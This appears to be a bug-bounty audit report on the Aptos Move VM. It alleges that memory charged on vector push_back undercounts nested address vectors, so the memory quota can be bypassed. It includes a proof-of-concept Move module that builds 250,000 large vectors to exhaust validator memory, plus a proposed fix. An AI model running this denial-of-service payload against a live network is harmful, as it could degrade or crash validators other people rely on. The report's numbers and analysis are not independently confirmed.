# Audit Report

## Title
Memory Quota Bypass via Incorrect Abstract Packed Size Calculation for Nested Address Vectors

## Summary
The `abstract_packed_size` calculation for `vector<address>` (and other specialized vector types) incorrectly returns only the vector overhead (40 units) instead of accounting for the contained elements. This causes a critical mismatch with `abstract_heap_size` used for memory release, allowing attackers to bypass the 10,000,000 unit memory quota and exhaust validator node memory.

## Finding Description

The vulnerability exists in the `abstract_packed_size` visitor implementation in `aptos-move/aptos-gas-schedule/src/gas_schedule/misc.rs`. When calculating the packed size of a `vector<address>`, the visitor only returns the vector container overhead without accounting for the addresses inside: [1](#0-0) 

This implementation simply calls `visit_vec` which only returns the vector overhead (40 units): [2](#0-1) 

The code even contains a TODO comment acknowledging this is a bug: [3](#0-2) 

This incorrect calculation is used by `charge_vec_push_back` to determine memory usage when pushing elements into vectors: [4](#0-3) 

However, when variables go out of scope, `charge_drop_frame` releases memory using `abstract_heap_size`, which correctly accounts for all elements: [5](#0-4) 

The `abstract_heap_size` calculation (which uses `abstract_value_size`) correctly accounts for all addresses in a vector: [6](#0-5) 

**Attack Scenario:**

```move
public entry fun exploit() {
    let outer = vector::empty<vector<address>>();
    let i = 0;
    while (i < 250000) {
        // Create inner vector with 10,000 addresses
        let inner = vector[@0x1, @0x2, ..., @0x10000];  
        // Charges: 32 * 10,000 = 320,000 units via vec_pack
        
        // Push into outer vector
        vector::push_back(&mut outer, inner);
        // Charges: Only 40 units (BUG!)
        
        // Inner variable drops at loop end
        // Releases: 320,000 units via abstract_heap_size
        
        // Net memory tracked: +40 units
        // Actual memory in outer: +320,000 units
        i = i + 1;
    }
    // Memory tracker shows: 250,000 * 40 = 10,000,000 units
    // Actual memory used: 250,000 * 320,000 = 80,000,000,000 units!
}
```

The memory quota is configured at 10,000,000 units: [7](#0-6) 

And is enforced by the memory algebra: [8](#0-7) 

## Impact Explanation

This is a **High Severity** vulnerability according to Aptos bug bounty criteria:

**Validator Node Memory Exhaustion (High):** Attackers can create transactions that bypass memory quotas and consume excessive physical memory on validator nodes, causing:
- Node slowdowns and performance degradation during transaction execution
- Potential out-of-memory crashes if physical RAM is exhausted
- Inability to process legitimate transactions while under attack
- Network availability impact if multiple validators are targeted simultaneously

This qualifies as a "Validator Node Slowdowns" (High severity) impact, as it causes significant performance degradation through resource exhaustion. While the bug affects all validators deterministically (no consensus split), the physical memory exhaustion creates a practical DoS vector against the network.

## Likelihood Explanation

**High Likelihood:**

- **Easy to Exploit:** Creating nested vectors is straightforward in Move with standard vector operations - no special permissions or complex setup required
- **Low Cost:** Attacker only pays normal gas for vector operations (vec_pack, push_back), not proportional to the actual memory consumed due to the tracking bug
- **No Mitigation:** The vulnerability exists in core gas metering logic with no current safeguards or rate limiting
- **Wide Attack Surface:** Any transaction submitted to the network can create nested vector structures
- **Deterministic:** The bug is deterministic and affects all validators equally, making it reliably exploitable

The attack can be executed by any unprivileged transaction sender through the standard transaction submission API.

## Recommendation

Fix the `visit_vec_address` (and other specialized vector visitor methods) in the `abstract_packed_size` implementation to correctly account for element sizes:

```rust
fn visit_vec_address(
    &mut self,
    depth: u64,
    vals: &[AccountAddress],
) -> PartialVMResult<()> {
    self.check_depth(depth)?;
    // Correctly account for addresses AND vector overhead
    self.res = Some(
        self.params.vector + 
        self.params.per_address_packed * NumArgs::new(vals.len() as u64)
    );
    Ok(())
}
```

Apply similar fixes to `visit_vec_u8`, `visit_vec_u16`, `visit_vec_u32`, `visit_vec_u64`, `visit_vec_u128`, `visit_vec_u256`, `visit_vec_bool`, and other specialized vector methods in the `abstract_packed_size` visitor.

## Proof of Concept

```move
module 0xbeef::memory_exploit {
    use std::vector;

    public entry fun exploit_memory_quota() {
        let outer = vector::empty<vector<address>>();
        let i = 0;
        
        // With 10M quota and bug: can push 250,000 vectors
        // Without bug: can only push ~31 vectors
        while (i < 250000) {
            let inner = create_large_vector();
            vector::push_back(&mut outer, inner);
            i = i + 1;
        }
        // If this completes, the bug exists
        // Actual memory: 80 billion units vs 10M tracked
    }
    
    fun create_large_vector(): vector<address> {
        let v = vector::empty<address>();
        let j = 0;
        while (j < 10000) {
            vector::push_back(&mut v, @0x1);
            j = j + 1;
        };
        v
    }
}
```

**Test Setup:** Configure memory quota to 10,000,000 units and execute the `exploit_memory_quota` function. If it completes without `MEMORY_LIMIT_EXCEEDED` error, the vulnerability is confirmed. Physical memory usage will be ~8000x higher than the tracked quota.

## Notes

This vulnerability affects all specialized vector types (VecU8, VecU16, VecU32, VecU64, VecU128, VecU256, VecBool, VecAddress) due to the TODO bug mentioned in the code comments. The mismatch between `abstract_packed_size` (used for charging) and `abstract_heap_size` (used for releasing) creates a systematic memory accounting error that can be exploited to bypass quotas. The existing test suite in `memory_quota.rs` tests memory limits but may not cover this specific nested vector scenario with the push/drop pattern that triggers the accounting mismatch.

### Citations

**File:** aptos-move/aptos-gas-schedule/src/gas_schedule/misc.rs (L451-459)
```rust
    fn visit_vec_address(&mut self, depth: u64, vals: &[AccountAddress]) -> PartialVMResult<()> {
        self.check_depth(depth)?;
        let mut size = self.params.per_address_packed * NumArgs::new(vals.len() as u64);
        if self.feature_version >= 3 {
            size += self.params.vector;
        }
        self.size += size;
        Ok(())
    }
```

**File:** aptos-move/aptos-gas-schedule/src/gas_schedule/misc.rs (L864-868)
```rust
            fn visit_vec(&mut self, depth: u64, _len: usize) -> PartialVMResult<bool> {
                self.check_depth(depth)?;
                self.res = Some(self.params.vector);
                Ok(false)
            }
```

**File:** aptos-move/aptos-gas-schedule/src/gas_schedule/misc.rs (L879-880)
```rust
            // TODO(Gas): The following function impls are necessary due to a bug upstream.
            //            Remove them once the bug is fixed.
```

**File:** aptos-move/aptos-gas-schedule/src/gas_schedule/misc.rs (L923-930)
```rust
            fn visit_vec_address(
                &mut self,
                depth: u64,
                vals: &[AccountAddress],
            ) -> PartialVMResult<()> {
                self.visit_vec(depth, vals.len())?;
                Ok(())
            }
```

**File:** aptos-move/aptos-memory-usage-tracker/src/lib.rs (L48-63)
```rust
    fn use_heap_memory(&mut self, amount: AbstractValueSize) -> PartialVMResult<()> {
        if self.feature_version >= 3 {
            match self.remaining_memory_quota.checked_sub(amount) {
                Some(remaining_quota) => {
                    self.remaining_memory_quota = remaining_quota;
                    Ok(())
                },
                None => {
                    self.remaining_memory_quota = 0.into();
                    Err(PartialVMError::new(StatusCode::MEMORY_LIMIT_EXCEEDED))
                },
            }
        } else {
            Ok(())
        }
    }
```

**File:** aptos-move/aptos-memory-usage-tracker/src/lib.rs (L608-617)
```rust
    fn charge_vec_push_back(&mut self, val: impl ValueView) -> PartialVMResult<()> {
        self.use_heap_memory(
            self.vm_gas_params()
                .misc
                .abs_val
                .abstract_packed_size(&val)?,
        )?;

        self.base.charge_vec_push_back(val)
    }
```

**File:** aptos-move/aptos-memory-usage-tracker/src/lib.rs (L634-651)
```rust
    fn charge_drop_frame(
        &mut self,
        locals: impl Iterator<Item = impl ValueView> + Clone,
    ) -> PartialVMResult<()> {
        self.release_heap_memory(locals.clone().try_fold(
            AbstractValueSize::zero(),
            |acc, val| {
                let heap_size = self
                    .vm_gas_params()
                    .misc
                    .abs_val
                    .abstract_heap_size(val, self.feature_version())?;
                Ok::<_, PartialVMError>(acc + heap_size)
            },
        )?);

        self.base.charge_drop_frame(locals)
    }
```

**File:** aptos-move/aptos-gas-schedule/src/gas_schedule/transaction.rs (L142-142)
```rust
        [memory_quota: AbstractValueSize, { 1.. => "memory_quota" }, 10_000_000],
```
